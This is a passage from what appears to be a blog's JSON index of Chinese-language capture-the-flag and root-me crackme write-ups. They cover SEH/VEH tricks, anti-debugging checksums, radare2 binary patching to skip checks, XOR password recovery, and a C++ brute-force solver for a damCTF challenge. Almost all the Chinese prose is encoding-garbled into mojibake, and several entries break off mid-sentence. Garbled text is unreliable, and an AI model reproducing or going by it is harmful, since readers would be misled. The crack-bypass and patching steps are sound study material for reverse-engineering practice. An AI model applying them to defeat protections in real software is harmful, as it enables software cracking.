ä¸­çš„æŒ‡ä»¤ï¼Œå®ƒå°†32ä½å¯„å­˜å™¨æˆ–åœ°å€è½¬æ¢ä¸º32ä½å€¼ï¼Œå¹¶å°†å…¶ç¬¦å·æ‰©å±•ä¸º64ä½å¯„å­˜å™¨ã€‚ ç¬¦å·æ‰©å±•é‡‡ç”¨æºçš„æœ€é«˜ä½ï¼ˆç¬¦å·ä½ï¼‰çš„å€¼ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¡«å……ç›®æ ‡çš„æ‰€æœ‰é«˜ä½ã€‚) var4+strä½ç½®åŠ var4(movzxæ˜¯å°†æºæ“ä½œæ•°çš„å†…å®¹æ‹·è´åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶å°†è¯¥å€¼ç”¨0æ‰©å±•è‡³16ä½æˆ–è€…32ä½ã€‚ä½†æ˜¯å®ƒåªé€‚ç”¨äºæ— ç¬¦å·æ•´æ•°ã€‚ ä»–å¤§è‡´ä¸‹é¢çš„ä¸‰ç§æ ¼å¼ã€‚) str[0]MOVSX æŒ‡ä»¤ï¼ˆè¿›è¡Œç¬¦å·æ‰©å±•å¹¶ä¼ é€ï¼‰å°†æºæ“ä½œæ•°å†…å®¹å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶æŠŠç›®çš„æ“ä½œæ•°ç¬¦å·æ‰©å±•åˆ° 16 ä½æˆ– 32 ä½ã€‚è¿™æ¡æŒ‡ä»¤åªç”¨äºæœ‰ç¬¦å·æ•´æ•°ï¼Œ xor (str[0] ,0xa3)=0xf7 str[1] cmp eax, 0xf7 æ³¨ï¼šä¸Šç¯‡æœ‰è‡ªåŠ¨åŒ–ä»£ç é“¾æ¥","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"root_me_PE_x86_SEHVEH_WP","slug":"root_me_PE_x86_SEHVEH_WP","date":"2020-10-13T11:02:38.000Z","updated":"2020-10-13T11:03:41.587Z","comments":true,"path":"2020/10/13/root_me_PE_x86_SEHVEH_WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/","excerpt":"PE DotNet - 0 protectionä½¿ç”¨ NET relectorå·¥å…·æˆ–è€…dnSPYhttps://github.com/0xd4d/dnSpy/releaseså°±å¯ä»¥ç ´è§£","text":"PE DotNet - 0 protectionä½¿ç”¨ NET relectorå·¥å…·æˆ–è€…dnSPYhttps://github.com/0xd4d/dnSpy/releaseså°±å¯ä»¥ç ´è§£ ELF x64 - Crackme automatingpython ç¼–ç¨‹ åˆ«äººå†™çš„ä»£ç https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/ int([x]) -&gt; integerint(x, base=10) -&gt; integerå°†æ•°å­—æˆ–å­—ç¬¦è½¬ä¸ºæ•´å½¢Convert a number or string to an integer, or return 0 if no arguments are given. num=line[addr+1,-1] byte.append(int (num,16)) //å°†numå˜ä¸º16è¿›åˆ¶ ä½¿ç”¨pwntools / Capstone /objdump è·å¾—åæ±‡ç¼–ä»£ç ä¹‹åè¿›è¡Œæœç´¢ PE x86 - SEHVEH_WPä»é¢˜ç›®çŸ¥é“æ˜¯å…³äºSEH å’Œ VEHï¼ˆVectoredExceptionHandlerï¼‰çš„ã€‚ OllyDBG æŸ¥çœ‹sehé“¾ é€‰æ‹© view-seh chain åœ¨è¾“å…¥åè¿›å…¥ä¸»è¦éƒ¨åˆ†ã€‚è¿™æ®µä¸æ˜¯å¾ˆæ‡‚ï¼Œæ ¹æ®å¤šæ¬¡è°ƒè¯•ååˆ¤æ–­ï¼Œå¦‚æœè¾“å…¥12ä¸ªå­—èŠ‚ï¼Œåˆ™0xB814A8å¤„å°±å¯ä»¥è·³è½¬ï¼Œä½¿EBPä¸º0.ä¸º0ï¼Œå³è¡¨ç¤ºå¯†ç æ­£ç¡®ï¼Œä¼šè¾“å…¥æˆåŠŸè¯­å¥ã€‚ æ¥ä¸‹æ¥æ˜¯ç¬¬ä¸€éƒ¨åˆ†å¯†ç LODSå³å°†å¯†ç å¤´å››ä¸ªå­—èŠ‚æ”¾å…¥EAXä¸­ï¼Œå°†0x5A643059 xor 0x 3628552Eå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†å¯†ç ï¼Œè¿˜éœ€ååºæ’åˆ—ä¸ºweLl FSï¼š[0] ä¸ºTEBç»“æ„ä½“ä¸­æŒ‡å‘ç¬¬ä¸€ä¸ªSEHç»“æ„ä½“åœ°å€å³0xEFFC14.æ¥ç€ï¼Œæ‰§è¡ŒINT 1æŒ‡ä»¤åï¼Œä¼šè¿›å…¥0xDB1D60å¤„çš„ç¬¬ä¸€ä¸ªSEHå‡½æ•°ã€‚SEHå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³[ESP+C]ä¸ºpContextçš„åœ°å€ï¼ŒpContextä¿å­˜çº¿ç¨‹åˆ‡æ¢æ—¶çš„å¯„å­˜å™¨ä¿¡æ¯ã€‚åœ¨PE 32ä½ä¸‹ï¼Œ+0xB0ä¸ºEAXå¯„å­˜å™¨çš„å€¼ï¼Œ0xB81D64å¤„å°†0x48335621åŠ åˆ°EAX+0xB0ä¸­ï¼Œä¿å­˜ç€è¾“å…¥çš„ç¬¬äºŒéƒ¨åˆ†å››å­—èŠ‚å¯†ç ã€‚+0xB8ä¸ºEIPå¯„å­˜å™¨çš„å€¼ï¼Œé€šè¿‡ä¸‹é¢çš„åˆ¤æ–­å°†EIPå€¼åŠ 2ï¼Œç»“æœä¸º0xB814E4ï¼Œå³INT 1æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ã€‚XOR EAX,EAXå°†EAXç½®0ï¼Œè¡¨ç¤ºä»å‘ç”Ÿå¼‚å¸¸çš„ä»£ç å¤„ç»§ç»­æ‰§è¡Œã€‚æœ€åè®¡ç®—å¦‚ä¸‹ï¼šFF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_ååºæ’åˆ—ä¸º_d@n 0xB814FFå¤„è°ƒç”¨AddVectoredExceptionHandlerå‡½æ•°ï¼Œæ–°å¢ä¸€ä¸ªSEHå‡½æ•°ã€‚ä»¥ä¸‹æ‘˜è‡ªhttps://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler 1234PVOID AddVectoredExceptionHandler( ULONG First, PVECTORED_EXCEPTION_HANDLER Handler); FirstThe order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.å¦‚æœä¸ä¸º0ï¼Œåˆ™æˆä¸ºç¬¬ä¸€ä¸ªè°ƒç”¨çš„SEHå‡½æ•°ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒFirst=1.HandlerA pointer to the handler to be called. For more information, see VectoredHandler.ä»å›¾ä¸­çœ‹å‡ºï¼Œå‡½æ•°åœ°å€ä¸º0xB81940ï¼ŒReturn valueIf the function succeeds, the return value is a handle to the exception handler.If the function fails, the return value is NULL.è¯¥å‡½æ•°å°†ç¬¬ä¸‰éƒ¨åˆ†çš„å››å­—èŠ‚å¯†ç å‡å»äº†ä¸€ä¸ªæ•°ï¼Œä¹‹åï¼Œåˆæ‰§è¡Œç¬¬äºŒä¸ªSEHå‡½æ•°ã€‚æœ‰ä¸ªç–‘é—®æ˜¯è¿™é‡Œå°†è¿”å›å€¼ç½®0ï¼Œåˆæ€ä¹ˆæ‰§è¡Œç¬¬äºŒä¸ªSEHå‡½æ•°ã€‚æœ€åè®¡ç®—å¦‚ä¸‹ï¼š3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!Eååºæ’åˆ—ä¸ºE!!! æœ€åä¸‰éƒ¨åˆ†å¯†ç ç»„åˆåœ¨ä¸€èµ·ï¼šweLl_d@nE!!!å¯†ç æ­£ç¡®","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"damCTF- rev/schlage (beginner) __WP","slug":"schlage (beginner) __WP","date":"2020-10-12T08:02:16.000Z","updated":"2020-10-12T08:08:47.094Z","comments":true,"path":"2020/10/12/schlage (beginner) __WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/12/schlage (beginner) __WP/","excerpt":"damCTF- rev/schlage (beginner) __WP å…ˆç”¨fileå‘½ä»¤æŸ¥çœ‹å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„ELFæ–‡ä»¶,debugä¿¡æ¯è¿˜åœ¨ æ¥ç€ä½¿ç”¨radare2åæ±‡ç¼– ä½¿ç”¨VVå‘½ä»¤è¿›å…¥è§†å›¾æ¨¡å¼","text":"damCTF- rev/schlage (beginner) __WP å…ˆç”¨fileå‘½ä»¤æŸ¥çœ‹å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„ELFæ–‡ä»¶,debugä¿¡æ¯è¿˜åœ¨ æ¥ç€ä½¿ç”¨radare2åæ±‡ç¼– ä½¿ç”¨VVå‘½ä»¤è¿›å…¥è§†å›¾æ¨¡å¼ æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯è§£é”ï¼Œè¿™é‡Œåˆ5æŠŠé” å…³é”®çš„ä»£ç æ˜¯è¿™5ä¸ªå‡½æ•° Pin1ç¬¬ä¸‰æŠŠé”æ¯”è¾ƒç®€å•ï¼Œæ¥çœ‹ç¬¬ä¸€æŠŠé” ä¹Ÿå¯ä»¥åœ¨è§†å›¾æ¨¡å¼æŒ‰oå†è¾“å…¥å‡½æ•°æ—è¾¹çš„å­—æ¯ è¿™æ˜¯ä¸€ä¸ªå¾ªç¯æ“ä½œï¼Œå…±äº”æ¬¡ï¼Œæ¯ä¸€æ¬¡å°†ä¸¤ä¸ªæ•°å­—å¼‚æˆ–ï¼Œæœ€åå’Œ0xeeæ¯”è¾ƒï¼Œç›¸åŒåˆ™æˆåŠŸrbp+rax-0x0eå³æŒ‡å‘å¼€å¤´ç§»å…¥åœ°å€çš„5ä¸ªæ•° 0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee ç»“æœä¸º0x99 jleï¼šJNB al, bl ï¼›alé‡Œçš„å†…å®¹ä¸ç­‰äºblæ—¶è·³è½¬JBE al, bl ï¼›alé‡Œçš„å†…å®¹å°äºæˆ–ç­‰äºblæ—¶è·³è½¬ ï¼›åŒç†ï¼ŒJGBæ˜¯å¤§äºæˆ–ç­‰äºï¼ŒJLEæ˜¯å°äºæˆ–ç­‰äºï¼›Aï¼ˆaboveï¼‰å¤§äºï¼ŒBï¼ˆbelowï¼‰å°äºï¼ŒEï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒæ— ç¬¦å·æ•°ï¼›Gï¼ˆgreatï¼‰å¤§äºï¼ŒLï¼ˆless thanï¼‰å°äºï¼Œ Eï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒå¸¦ç¬¦å·æ•° pin5 srand()ç¬¬5æŠŠé”ç”¨åˆ°äº†srand()å’Œrand()ä¸¤ä¸ªå‡½æ•°ã€‚ æ ¹æ®ç§å­äº§ç”Ÿéšæœºæ•°1) ç»™srand()æä¾›ä¸€ä¸ªç§å­ï¼Œå®ƒæ˜¯ä¸€ä¸ªunsigned intç±»å‹ï¼›2) è°ƒç”¨rand()ï¼Œå®ƒä¼šæ ¹æ®æä¾›ç»™srand()çš„ç§å­å€¼è¿”å›ä¸€ä¸ªéšæœºæ•°(åœ¨0åˆ°RAND_MAXä¹‹é—´)ï¼› ä¹Ÿå°±æ˜¯ï¼Œä¸€ä¸ªç§å­ï¼Œå®ƒæ‰€äº§ç”Ÿçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚123unsigned int a=1111638594ï¼› //0x42424242srand(a); cout&lt;&lt;rand()&lt;&lt;endl; è¾“å…¥rand()ç”Ÿæˆçš„éšæœºæ•°å³å¯ï¼Œå³ä¸º1413036362 lealeaæ˜¯â€œload effective addressâ€çš„ç¼©å†™ï¼Œç®€å•çš„è¯´ï¼ŒleaæŒ‡ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªå†…å­˜åœ°å€ç›´æ¥èµ‹ç»™ç›®çš„æ“ä½œæ•°ï¼Œä¾‹å¦‚ï¼šlea eax,[ebx+8]å°±æ˜¯å°†ebx+8è¿™ä¸ªå€¼ç›´æ¥èµ‹ç»™eaxï¼Œè€Œä¸æ˜¯æŠŠebx+8å¤„çš„å†…å­˜åœ°å€é‡Œçš„æ•°æ®èµ‹ç»™eaxã€‚è€ŒmovæŒ‡ä»¤åˆ™æ°æ°ç›¸åï¼Œä¾‹å¦‚ï¼šmov eax,[ebx+8]åˆ™æ˜¯æŠŠå†…å­˜åœ°å€ä¸ºebx+8å¤„çš„æ•°æ®èµ‹ç»™eaxã€‚ pin2æŸ¥çœ‹æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œpin2æ ¹æ®å®é™…è¾“å‡ºäº†ä¸€ä¸ªç§å­ï¼Œæ ¹æ®ç§å­è°ƒç”¨rand()å³å¯ã€‚ è¿™ä¸ªç§å­ä¸‹ä¸€æŠŠé”è¿˜è¦ç”¨åˆ°ï¼Œå†ä¸€æ¬¡è°ƒç”¨rand()ï¼Œè·å¾—çš„æ˜¯ç¬¬äºŒä¸ªéšæœºæ•°ã€‚ pin4æˆ‘è®¤ä¸ºè¿™æ˜¯æœ€éš¾å¾—äº†ï¼Œä¸»è¦æ˜¯ç¼–ç¨‹ã€‚ç›´æ¥çœ‹r2 å¤ªå¤æ‚ï¼Œæ‰€ä»¥æˆ‘ç”¨IDA PROï¼Œç„¶åF5åç¼–è¯‘ã€‚1234567891011121314151617puts(\"What's your favorite sentence?\"); fgets(s, 32, stdin); s[strcspn(s, \"\\n\")] = 0; //æ¢è¡Œç¬¦å˜ä¸º0x00 v3 = rand() % 10 + 65; v1 = 0; v4 = strlen(s); // strlen é‡åˆ°/0ç»“æŸ for ( i = 0; i &lt; v4; ++i ) v1 += v3 ^ s[i]; //å°†éšæœºå€¼ä¸å­—ç¬¦å¼‚æˆ–ï¼Œç»“æœç›¸åŠ è¦ä¸º291 if ( v1 == 291 ) &#123; puts(\"Such a cool sentence!\"); byte_20203C = 1; &#125; else &#123; puts(\"Not a big fan of that sentence\"); &#125; æ³¨é‡Šå·²ç»å†™åœ¨ä»£ç ä¸­ï¼Œæ¥ä¸‹æ¥ï¼Œå°±æ˜¯ç¼–ç¨‹ç ´è§£å¾—åˆ°ç¬¦åˆçš„å­—ç¬¦ä¸²ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;string&gt;using namespace std; int main()&#123; /*FILE *pe=NULL; char s[1]=&#123;'1'&#125;; pe=popen(\"nc chals.damctf.xyz 31932\",\"rw\"); if(pe==NULL) cout&lt;&lt;\"connect failed\"&lt;&lt;endl; while (1) &#123; fwrite(s,sizeof(s),1,pe); fgets(s,20,pe); cout&lt;&lt;s; break; &#125; pclose(pe);*/ unsigned int a=1602480388;//1111638594 srand(a); cout&lt;&lt;rand()&lt;&lt;endl; int v3 = rand() % 10 + 65; cout&lt;&lt;\"v3=\"&lt;&lt;v3&lt;&lt;endl; //=74 int remain=291; //291ä¸‹æœç´¢ int qu=0; int resu; for (int i=0;i&lt;32;i++)&#123; //æœ€å¤§å…è®¸è¾“å…¥31ä¸ªå­—ç¬¦ for(int j=0;j&lt;58;j++)&#123; //ä»Aå¼€å§‹æœç´¢ resu=v3^int('A'+j); if(resu==0) //==0æ²¡æœ‰ç”¨ &#123;continue;&#125; else if ( resu&lt;remain || remain%resu==0)&#123; //å®é™…ä¸Šæ„Ÿè§‰ä¸ç”¨åŠ åé¢çš„æ¡ä»¶ qu+=remain/resu; //ç´¯è®¡å¾—åˆ°çš„å­—ç¬¦æ•° if(qu&gt;31)&#123; //ä¸èƒ½å¤§äº31 qu-=remain/resu; continue; &#125; for(int k=0;k&lt;remain/resu;k++) //è¾“å‡ºæˆåŠŸçš„å­—ç¬¦ cout&lt;&lt;char('A'+j); cout&lt;&lt;endl; remain=remain%resu; //æ›´æ–°ä½™ä¸‹å€¼ cout&lt;&lt;\"i= \"&lt;&lt;i&lt;&lt;\" \"&lt;&lt;\"resu=\"&lt;&lt;resu&lt;&lt;\"qu= \"&lt;&lt;qu&lt;&lt;\"remain=\"&lt;&lt;remain&lt;&lt;endl; i=qu-1; //æ›´æ–°i cout&lt;&lt;\"after i= \"&lt;&lt;i&lt;&lt;endl; break; &#125; &#125; if (remain==0) //å¡«æ»¡291 æˆåŠŸ &#123; cout&lt;&lt;\"find\"&lt;&lt;\"i=\"&lt;&lt;i&lt;&lt;endl; break; &#125; else if(i&gt;=31) //æœ€åéƒ½æ²¡æœ‰æœç´¢åˆ°ï¼Œå¤±è´¥ &#123; cout&lt;&lt;endl&lt;&lt;\"don't find\"&lt;&lt;endl; cout&lt;&lt;\"remainder= \"&lt;&lt;remain&lt;&lt;endl; break; &#125; &#125; return 0;&#125; è¾“å…¥å­—ç¬¦ï¼ŒæˆåŠŸè§£é”ã€‚ æœ€åflagæ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡å™¨ï¼Œä½†é“¾æ¥æ—¶é—´å¾ˆçŸ­ï¼Œå¯èƒ½éœ€è¦è„šæœ¬è‡ªåŠ¨åŒ–å‘é€ï¼Œæœ‰ç‚¹å°éš¾ğŸ˜¢ fgets()C åº“å‡½æ•° char fgets(char str, int n, FILE *stream) ä»æŒ‡å®šçš„æµ stream è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†…ã€‚å½“è¯»å– (n-1) ä¸ªå­—ç¬¦æ—¶ï¼Œæˆ–è€…è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ï¼Œå…·ä½“è§†æƒ…å†µè€Œå®šã€‚ strlen()C åº“å‡½æ•° size_t strlen(const char *str) è®¡ç®—å­—ç¬¦ä¸² str çš„é•¿åº¦ï¼Œç›´åˆ°ç©ºç»“æŸå­—ç¬¦ï¼Œä½†ä¸åŒ…æ‹¬ç©ºç»“æŸå­—ç¬¦ã€‚ ç»“æŸè¯­ä¸æ„§æ˜¯æ–°æ‰‹é¢˜ï¼Œåªæ˜¯æœ€åç¼–ç¨‹èŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"é€†å‘_root_me_3","slug":"é€†å‘_root_me_3","date":"2020-10-08T12:21:43.000Z","updated":"2020-10-08T12:22:25.176Z","comments":true,"path":"2020/10/08/é€†å‘_root_me_3/","link":"","permalink":"http://finsenty54.github.io/2020/10/08/é€†å‘_root_me_3/","excerpt":"ELF x86 - No software breakpointsçœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åè°ƒè¯•æŠ€æœ¯ï¼Œå®ƒä¸èƒ½åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­æ”¾ç½®ä»»ä½•è½¯ä»¶æ–­ç‚¹ã€‚å› ä¸ºå½“æˆ‘ä»¬åœ¨ç”¨æˆ·æ¨¡å¼åº”ç”¨ç¨‹åºä¸­é‡åˆ°æ–­ç‚¹æ—¶ï¼Œä»£ç ä¸­å°†æ”¾å…¥0xCCï¼ˆint3ï¼‰ï¼Œå› æ­¤è®¡ç®—å°†æ˜¯é”™è¯¯çš„ï¼Œå¹¶å°†ç”Ÿæˆé”™è¯¯çš„æ ¡éªŒå’Œ.","text":"ELF x86 - No software breakpointsçœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åè°ƒè¯•æŠ€æœ¯ï¼Œå®ƒä¸èƒ½åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­æ”¾ç½®ä»»ä½•è½¯ä»¶æ–­ç‚¹ã€‚å› ä¸ºå½“æˆ‘ä»¬åœ¨ç”¨æˆ·æ¨¡å¼åº”ç”¨ç¨‹åºä¸­é‡åˆ°æ–­ç‚¹æ—¶ï¼Œä»£ç ä¸­å°†æ”¾å…¥0xCCï¼ˆint3ï¼‰ï¼Œå› æ­¤è®¡ç®—å°†æ˜¯é”™è¯¯çš„ï¼Œå¹¶å°†ç”Ÿæˆé”™è¯¯çš„æ ¡éªŒå’Œ.è¿™æ˜¯åœ¨ecxä¸­è®¡ç®—ä¸€ç§æ•£åˆ—å€¼ï¼Œå®ƒåŸºäºå…¥å£ç‚¹çš„æ•´ä¸ªä»£ç ã€‚å¦‚æœæˆ‘ä»¬å¯¹å‡½æ•°è¿›è¡Œä»»ä½•æ›´æ”¹ï¼Œå€¼å°†ä¸å†ç›¸åŒï¼Œä»è€Œé˜»æ­¢æˆ‘ä»¬ç¼–è¾‘äºŒè¿›åˆ¶æ–‡ä»¶. è®¡ç®—æ•´ä¸ªtext æŒ‡ä»¤çš„å’Œï¼Œæ‰€ä»¥æ”¾å…¥0xCCä¼š æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æ”¹å˜çš„æŒ‡ä»¤ã€‚ ç§»ä½è¿ç®—ç¬¦a&lt;&lt;3açš„å†…å®¹ä¸æ”¹å˜ edx &amp; 0xffå–æœ€å8ä½ g++g++ä¸»è¦ç”¨æ¥ç¼–è¯‘c++æ–‡ä»¶ï¼Œg++ç¼–è¯‘c++æ–‡ä»¶æ˜¯ä¼šè¿æ¥libc++ã€‚ gccä¸»è¦ç”¨æ¥ç¼–è¯‘cæ–‡ä»¶ï¼Œä¹Ÿå¯ç¼–è¯‘c++ï¼Œä½†gccç¼–è¯‘c++æ–‡ä»¶é»˜è®¤ä¸è¿æ¥libc++ã€‚ ç§»ä½ç§»ä½æ—¶ï¼Œç§»å‡ºçš„ä½æ•°å…¨éƒ¨ä¸¢å¼ƒï¼Œç§»å‡ºçš„ç©ºä½è¡¥å…¥çš„æ•°ä¸å·¦ç§»è¿˜æ˜¯å³ç§»æœ‰å…³ã€‚å¦‚æœæ˜¯å·¦ç§»ï¼Œåˆ™è§„å®šè¡¥å…¥çš„æ•°å…¨éƒ¨æ˜¯0ï¼›å¦‚æœæ˜¯å³ç§»ï¼Œè¿˜ä¸è¢«ç§»ä½çš„æ•°æ®æ˜¯å¦å¸¦ç¬¦å·æœ‰å…³ã€‚è‹¥æ˜¯ä¸å¸¦ç¬¦å·æ•°ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ä¸º0ï¼›è‹¥æ˜¯å¸¦ç¬¦å·æ•°ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ç­‰äºåŸæ•°çš„æœ€å·¦ç«¯ä½ä¸Šçš„åŸæ•°(å³åŸç¬¦å·ä½) å‘½åç©ºé—´å¼•å…¥äº†å‘½åç©ºé—´è¿™ä¸ªæ¦‚å¿µï¼Œå®ƒå¯ä½œä¸ºé™„åŠ ä¿¡æ¯æ¥åŒºåˆ†ä¸åŒåº“ä¸­ç›¸åŒåç§°çš„å‡½æ•°ã€ç±»ã€å˜é‡ç­‰ã€‚ä½¿ç”¨äº†å‘½åç©ºé—´å³å®šä¹‰äº†ä¸Šä¸‹æ–‡ã€‚æœ¬è´¨ä¸Šï¼Œå‘½åç©ºé—´å°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªèŒƒå›´ã€‚ å¯ä»¥ä½¿ç”¨ using namespace æŒ‡ä»¤ï¼Œè¿™æ ·åœ¨ä½¿ç”¨å‘½åç©ºé—´æ—¶å°±å¯ä»¥ä¸ç”¨åœ¨å‰é¢åŠ ä¸Šå‘½åç©ºé—´çš„åç§°ã€‚è¿™ä¸ªæŒ‡ä»¤ä¼šå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œåç»­çš„ä»£ç å°†ä½¿ç”¨æŒ‡å®šçš„å‘½åç©ºé—´ä¸­çš„åç§°ã€‚ ELF x86 - CrackPassgdb-peda$ help xExamine memory: x/FMT ADDRESS. gdb-peda$ print/t $ebxäºŒè¿›åˆ¶æ‰“å°å¯„å­˜å™¨ set $ZF = 6 set $eflags |= (1 &lt;&lt; $ZF) è®¾å®šZFå€¼ä¸º1 show whereæ˜¾ç¤ºå½“å‰ä½ç½® MOVZX æŒ‡ä»¤ï¼ˆè¿›è¡Œå…¨é›¶æ‰©å±•å¹¶ä¼ é€ï¼‰å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶æŠŠç›®çš„æ“ä½œæ•° æ‰©å±•åˆ° 16 ä½æˆ– 32 ä½ã€‚ r2 å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°å›¾å½¢æ¨¡å¼ä¸‹ï¼ŒæŒ‰oè¿›è¡Œè·³è½¬æŒ‰uè¿”å›ä¸Šä¸€ä¸ªå‡½æ•° ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9 25260060504_VE_T25_t_ Usage: jump LOCATIONGive as argument either LINENUM or *ADDR, where ADDR is an express","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"é€†å‘_root_me_2","slug":"é€†å‘_root_me_2","date":"2020-10-07T06:27:22.000Z","updated":"2020-10-07T06:29:06.581Z","comments":true,"path":"2020/10/07/é€†å‘_root_me_2/","link":"","permalink":"http://finsenty54.github.io/2020/10/07/é€†å‘_root_me_2/","excerpt":"é€†å‘ root_mePE .NEThttps://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection","text":"é€†å‘ root_mePE .NEThttps://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection MIPS. ELF MIPS - Basic Crackmehttps://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme åœ¨MIPSæ¶æ„ä¸­ï¼Œâ€œ $ raâ€å¯„å­˜å™¨ä¿å­˜è¿”å›åœ°å€ï¼Œç±»ä¼¼äºx86æŒ‡ä»¤æŒ‡é’ˆâ€œ EIPâ€ ELF fake instrucationshttps://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints dis main gdb-peda$ set disassembly-flavor intel //æ±‡ç¼–ç”¨intelè¯­è¨€æ˜¾ç¤º gdb-peda$ i r $edx //æ˜¾ç¤ºedxå€¼ ni //ni/siéƒ½æ˜¯æ±‡ç¼–çº§åˆ«çš„æ–­ç‚¹å®šä½ã€‚siä¼šè¿›å…¥æ±‡ç¼–å’ŒCå‡½æ•°å†…éƒ¨,niä¸ä¼š //è¿™ä¸¤ä¸ªå‘½ä»¤ï¼ˆsi/niï¼‰æ‰€é’ˆå¯¹çš„æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œè€Œs/né’ˆå¯¹çš„æ˜¯æºä»£ç  jz è¡¨ç¤ºå½“zf =1æ—¶è·³è½¬ï¼Œå³ç»“æœä¸º0è·³è½¬ã€‚jnz å³ zf=0æ—¶è·³è½¬ï¼Œå³ç»“æœä¸ä¸º0 è·³è½¬ã€‚ gdb-peda$ i r //å…¨æ˜¾ç¤º gdb-peda$ set $eax=0 gdb-peda$ x/s $eax //æŸ¥çœ‹å¯„å­˜å™¨æŒ‡å‘çš„å†…å®¹ call WPA(&quot;toto&quot;, &quot;toto&quot;) //ç›´æ¥åœ¨gdbä¸­è¿è¡Œå‘½ä»¤ï¼Ÿï¼Ÿ ELF ptracehttps://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace Load the application into IDA pro,search main function,press F5to disassemble it,get the code below:IDA æŒ‰F5 åç¼–è¯‘ ç”Ÿæˆä¼ªä»£ç  r2 -ww ./ch3.bin -w open file in write mode ww foobar write wide string &apos;f\\x00o\\x00o\\x00b\\x00a\\x00r\\x00&apos; wx 9090 write two intel nops [0x080482f0]&gt; wx eb @ 0x0804841AShort Jumpï¼ˆçŸ­è·³è½¬ï¼‰æœºå™¨ç  EB pd N disassemble N instructions gdb-peda$ i b set $al=$dl","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary","slug":"é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary","date":"2020-10-06T06:18:05.000Z","updated":"2020-10-06T06:19:13.677Z","comments":true,"path":"2020/10/06/é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary/","link":"","permalink":"http://finsenty54.github.io/2020/10/06/é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary/","excerpt":"INT å’Œ IATINT æ˜¯rvaæ•°ç»„ï¼ŒINTè¡¨ç¤ºæ•°ç»„é¦–åœ°å€ æ•°ç»„å…ƒç´ æ˜¯ä¸€ä¸ªåœ°å€ æŒ‡å‘ç”±ä¸€ä¸ª2å­—èŠ‚ordinallåœ°å€å’Œå‡½æ•°åç§°ç»„æˆçš„ç»“æ„ä½“ ç¬¬ä¸€ä¸ªå€¼åœ°å€æŒ‡å‘ç¬¬ä¸€ä¸ªç»“æ„ä½“ å¦‚æœIATå­˜åœ¨äº 